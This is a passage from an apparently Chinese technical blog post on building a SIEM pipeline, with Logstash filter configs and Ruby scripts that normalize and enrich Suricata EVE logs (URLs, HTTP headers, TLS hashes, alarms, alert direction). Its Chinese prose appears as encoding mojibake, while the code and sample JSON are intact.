class="string">&quot;[destination][domain]&quot;</span> =&gt; <span class="string">&quot;[url][domain]&quot;</span> &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                @pattern = /(?&lt;path&gt;[^?#]*)(?:\?(?&lt;query&gt;[^#]*))?(?:#(?&lt;fragment&gt;.*))?/</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                url = event.get(&#x27;[suricata][eve][http][url]&#x27;)</span></span><br><span class="line"><span class="string">                res = @pattern.match(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if res[&#x27;path&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][path]&#x27;, res[&#x27;path&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                if res[&#x27;query&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][query]&#x27;, res[&#x27;query&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                if res[&#x27;fragment&#x27;] then</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[url][fragment]&#x27;, res[&#x27;fragment&#x27;])</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][url]&quot;</span> =&gt; <span class="string">&quot;[url][original]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_refer]&quot;</span> =&gt; <span class="string">&quot;[http][request][referrer]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][length]&quot;</span> =&gt; <span class="string">&quot;[http][response][body][bytes]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_user_agent]&quot;</span> =&gt; <span class="string">&quot;[user_agent][original]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-6-normalized-http-headers-for-suricata"><a href="#1-1-6-normalized-http-headers-for-suricata" class="headerlink" title="1.1.6 normalized_http_headers_for_suricata"></a>1.1.6 normalized_http_headers_for_suricata</h5><p>â€‹        å½“<strong>Suricata</strong>è®¾ç½®<code>dump-all-headers:both</code>æ—¶ï¼Œä¼šå°†HTTPå¤´å…¨éƒ¨è¾“å‡ºã€‚å¯¹äºhttp_auditè¿™ä¸ªéœ€æ±‚è€Œè¨€æ˜¯ä¸ªå¾ˆå¥½çš„åŠŸèƒ½ï¼Œåªä¸è¿‡è¾“å‡ºçš„æ ¼å¼æœ‰ç‚¹å‘ğŸ˜‚ğŸ˜‚ğŸ˜‚ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„åœ¨Kibanaä¸Šè¿›è¡Œç­›é€‰ï¼Œæˆ‘å¯¹è¿™éƒ¨åˆ†æ•°æ®è¿›è¡Œäº†æ ‡å‡†åŒ–ã€‚ğŸ˜</p>
<h6 id="Logstash-Config-5"><a href="#Logstash-Config-5" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-http.conf">normalized_http_headers_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][http] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/normalized_http_headers.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code"><a href="#Ruby-Code" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/normalized_http_headers.rb">normalized_http_headers_for_suricata.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    request = &#123;&#125;</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    request_headers = event.get(<span class="string">&quot;[suricata][eve][http][request_headers]&quot;</span>)</span><br><span class="line">    response_headers = event.get(<span class="string">&quot;[suricata][eve][http][response_headers]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request_headers <span class="keyword">then</span></span><br><span class="line">        request_headers.each <span class="keyword">do</span> <span class="params">|headers|</span></span><br><span class="line">            name = headers[<span class="string">&#x27;name&#x27;</span>].downcase</span><br><span class="line">            value = headers[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">            request[name] = value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response_headers <span class="keyword">then</span></span><br><span class="line">        response_headers.each <span class="keyword">do</span> <span class="params">|headers|</span></span><br><span class="line">            name = headers[<span class="string">&#x27;name&#x27;</span>].downcase</span><br><span class="line">            value = headers[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">            response[name] = value</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.remove(<span class="string">&quot;[suricata][eve][http][request_headers]&quot;</span>)</span><br><span class="line">    event.remove(<span class="string">&quot;[suricata][eve][http][response_headers]&quot;</span>)</span><br><span class="line">    event.set(<span class="string">&quot;[suricata][eve][http][request]&quot;</span>, request)</span><br><span class="line">    event.set(<span class="string">&quot;[suricata][eve][http][response]&quot;</span>, response)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h6><ul>
<li>æ ‡å‡†åŒ–ä¹‹å‰çš„æ•°æ®ï¼š</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;request_headers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Connection&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;Keep-Alive&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;response_headers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Server&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;NWS_TCloud_S11&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ ‡å‡†åŒ–ä¹‹åçš„æ•°æ®ï¼š</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;192.168.199.1:25782&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;Close&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user-agent&quot;</span>: <span class="string">&quot;Microsoft-Windows/10.0 UPnP/1.0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;text/xml, application/xml&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;response&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;ext&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;content-length&quot;</span>: <span class="string">&quot;2645&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;content-type&quot;</span>: <span class="string">&quot;text/xml; charset=\&quot;utf-8\&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-7-normalized-tls-for-suricata"><a href="#1-1-7-normalized-tls-for-suricata" class="headerlink" title="1.1.7 normalized-tls_for_suricata"></a>1.1.7 normalized-tls_for_suricata</h5><h6 id="Logstash-Config-6"><a href="#Logstash-Config-6" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-tls.conf">normalized-tls_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][tls] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            uppercase =&gt; [</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span></span><br><span class="line">            ]</span><br><span class="line">            split =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;:&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            join =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            copy =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;[related][hash]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-normalized-alarm-from-siem"><a href="#1-2-normalized-alarm-from-siem" class="headerlink" title="1.2 normalized-alarm_from_siem"></a>1.2 normalized-alarm_from_siem</h4><p>â€‹        é’ˆå¯¹alarmäº‹ä»¶è¿›è¡Œæ ‡å‡†åŒ–ï¼Œä¹Ÿå°±æ˜¯SIEMå‘å‡ºçš„æ•°æ®ã€‚å‚è€ƒä¸Šå›¾ä¸­çº¢è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†</p>
<h5 id="1-2-1-normalized-alarm"><a href="#1-2-1-normalized-alarm" class="headerlink" title="1.2.1 normalized-alarm"></a>1.2.1 normalized-alarm</h5><p>â€‹        é€šç”¨alarmäº‹ä»¶æ ‡å‡†åŒ–é…ç½®ã€‚</p>
<h6 id="Logstash-Config-7"><a href="#Logstash-Config-7" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/70_normalized-siem.conf">normalized-alarm.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    date &#123;</span><br><span class="line">        match =&gt; [<span class="string">&quot;timestamp&quot;</span>, <span class="string">&quot;ISO8601&quot;</span>]</span><br><span class="line">        target =&gt; <span class="string">&quot;timestamp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        rename =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[data][source]&quot;</span> =&gt; <span class="string">&quot;source&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][destination]&quot;</span> =&gt; <span class="string">&quot;destination&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][network]&quot;</span> =&gt; <span class="string">&quot;network&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;[data][event]&quot;</span> =&gt; <span class="string">&quot;event&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][fileset]&quot;</span> =&gt; <span class="string">&quot;fileset&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;[data][http]&quot;</span> =&gt; <span class="string">&quot;http&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][url]&quot;</span> =&gt; <span class="string">&quot;url&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][user_agent]&quot;</span> =&gt; <span class="string">&quot;user_agent&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[data][related]&quot;</span> =&gt; <span class="string">&quot;related&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][threat]&quot;</span> =&gt; <span class="string">&quot;threat&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[rule][groups]&quot;</span> =&gt; <span class="string">&quot;[rule][ruleset]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        convert =&gt; &#123;</span><br><span class="line">            <span class="comment">#&quot;[agent][id]&quot; =&gt; &quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[event][severity]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[related][rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[network][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[network][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[source][port]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[source][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[source][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[destination][port]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[destination][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[destination][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[http][response][status_code]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[http][response][body][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        remove_field =&gt; [</span><br><span class="line">            <span class="string">&quot;beat&quot;</span>, <span class="string">&quot;input_type&quot;</span>, <span class="string">&quot;tags&quot;</span>, <span class="string">&quot;count&quot;</span>, <span class="string">&quot;@version&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ecs&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;offset&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;predecoder&quot;</span>,</span><br><span class="line">            <span class="string">&quot;decoder&quot;</span>, <span class="string">&quot;[data][rule]&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        copy =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[rule][description]&quot;</span> =&gt; <span class="string">&quot;[rule][name]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;previous_output&quot;</span> =&gt; <span class="string">&quot;[related][event][log]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                src_ip = event.get(&#x27;[source][ip]&#x27;)</span></span><br><span class="line"><span class="string">                dst_ip = event.get(&#x27;[destination][ip]&#x27;)</span></span><br><span class="line"><span class="string">                src_port = event.get(&#x27;[source][port]&#x27;).to_s</span></span><br><span class="line"><span class="string">                dst_port = event.get(&#x27;[destination][port]&#x27;).to_s</span></span><br><span class="line"><span class="string">                rule_name = event.get(&#x27;[related][rule][name]&#x27;)[0].to_s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                rule_description = src_ip + &#x27;:&#x27; + src_port + &#x27; -&gt; &#x27; + dst_ip + &#x27;:&#x27; + dst_port + &#x27; -&gt; &#x27; + rule_name</span></span><br><span class="line"><span class="string">                event.set(&#x27;[rule][description]&#x27;, rule_description)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if event.get(&#x27;[related][rule][id]&#x27;) then</span></span><br><span class="line"><span class="string">                    sid = event.get(&#x27;[related][rule][id]&#x27;)[0]</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[rule][uuid]&#x27;, sid)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                event.set(&#x27;[rule][category]&#x27;, &#x27;Frequency&#x27;)</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-Enrichment"><a href="#2-Enrichment" class="headerlink" title="2. Enrichment"></a>2. Enrichment</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/enrichment-0.1.png" alt="image-20201208110506481"></p>
<hr>
<h4 id="2-1-enrichment-alert-to-siem"><a href="#2-1-enrichment-alert-to-siem" class="headerlink" title="2.1 enrichment_alert_to_siem"></a>2.1 enrichment_alert_to_siem</h4><p>â€‹        é’ˆå¯¹alertäº‹ä»¶è¿›è¡Œä¸°å¯ŒåŒ–ï¼Œä¹Ÿå°±æ˜¯å®‰å…¨è®¾å¤‡å‘å‡ºçš„åŸå§‹å®‰å…¨äº‹ä»¶ã€‚å‚è€ƒä¸Šå›¾ä¸­è“è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†</p>
<h5 id="2-1-1-enrichment-alert-direction-for-suricata"><a href="#2-1-1-enrichment-alert-direction-for-suricata" class="headerlink" title="2.1.1 enrichment-alert_direction_for_suricata"></a>2.1.1 enrichment-alert_direction_for_suricata</h5><p>â€‹        ç”±äºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œæˆ‘ä¸å¾—ä¸å°†<strong>suricata.yaml</strong>é…ç½®æ–‡ä»¶ä¸­çš„<code>EXTERNAL_NET = any</code>ã€‚è¿™ä¹Ÿå¯¼è‡´äº†éƒ¨åˆ†Suricataå‘Šè­¦çš„è¯¯æŠ¥ï¼Œæ¯•ç«Ÿæ”¾å¼€äº†è§„åˆ™çš„æ–¹å‘è¿™ä¸ªæ”¶æ•›æ¡ä»¶ã€‚æ‰€ä»¥ï¼Œæˆ‘åˆ©ç”¨äº†Logstash åœ¨æ•°æ®å…¥åº“åˆ°SIEMä¹‹å‰åšäº†ä¸€å±‚è¿‡æ»¤ã€‚</p>
<h6 id="Logstash-Config-8"><a href="#Logstash-Config-8" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/72_enrichment-alert_direction.conf">enrichment-alert_direction_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [rule][description] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/add_direction.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-1"><a href="#Ruby-Code-1" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/add_direction.rb">enrichment-alert_direction_for_suricata.rb</a></strong><ul>
<li><em>è¿‡æ»¤è§¦å‘è§„åˆ™çš„IPä¸è§„åˆ™æ–¹å‘ä¸åŒ¹é…çš„å®‰å…¨äº‹ä»¶</em></li>
<li><em>å¢åŠ æ–¹å‘ä¸åŒºåŸŸçš„å­—æ®µï¼Œä¾¿äºåˆ†æäººå‘˜ç¬¬ä¸€æ—¶é—´è¯†åˆ«<strong>å†…å¯¹å†…</strong>ä»¥åŠ<strong>å†…å¯¹å¤–</strong>çš„å‘Šè­¦ã€‚</em></li>
</ul>
</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> src_ip <span class="keyword">or</span> <span class="keyword">not</span> dst_ip <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ipaddr_src = IPAddr.new src_ip</span><br><span class="line">    ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sample: alert http $EXTERNAL_NET any -&gt; $HOME_NET any</span></span><br><span class="line">    rule = event.get(<span class="string">&quot;[rule][description]&quot;</span>)</span><br><span class="line">    src_direction = rule.split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    dst_direction = rule.split(<span class="string">&quot; &quot;</span>)[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    src_private = ipaddr_src.private?()</span><br><span class="line">    dst_private = ipaddr_dst.private?()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> event.get(<span class="string">&quot;provider&quot;</span>) == <span class="string">&quot;Suricata&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> ( src_private ) <span class="keyword">and</span> ( src_direction == <span class="string">&quot;$EXTERNAL_NET&quot;</span> ) <span class="keyword">then</span></span><br><span class="line">            event.cancel</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( dst_private ) <span class="keyword">and</span> ( dst_direction == <span class="string">&quot;$EXTERNAL_NET&quot;</span> ) <span class="keyword">then</span></span><br><span class="line">            event.cancel</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> src_private <span 